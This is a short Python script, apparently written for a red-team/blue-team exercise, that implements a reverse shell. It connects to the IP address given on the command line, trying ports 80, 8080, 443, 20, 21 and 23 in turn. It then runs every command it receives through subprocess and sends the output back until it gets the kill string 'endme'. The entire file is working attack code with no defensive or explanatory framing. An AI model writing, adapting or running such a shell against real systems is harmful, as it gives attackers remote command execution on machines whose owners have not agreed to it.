import socket
import sys
import subprocess

# arg should be the ip address of the blue team machine
HOST = sys.argv[1]  # assume this is a valid arg because it'll be used by the team
PORTS = [80, 8080, 443, 20, 21, 23]  # same ports at blue.py; we're gonna try them all

KILLSTRING = "endme"

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

conn = False
p = 0

while not conn:
	try:
		conn = True
		print(f'Trying port {PORTS[p]}')
		sock.connect((HOST, PORTS[p]))
		print(f'Socket bound to port {PORTS[p]}')
		sock.sendall("yeehaw".encode())
		while True:
			data = sock.recv(1024).decode()
			if data == KILLSTRING:
				sock.close()
				conn = False
				break
			msg = subprocess.getoutput(data.lower())
			sock.sendall(msg.encode())
	except:
		conn = False
		p += 1
		if p == 6:
			p = 0
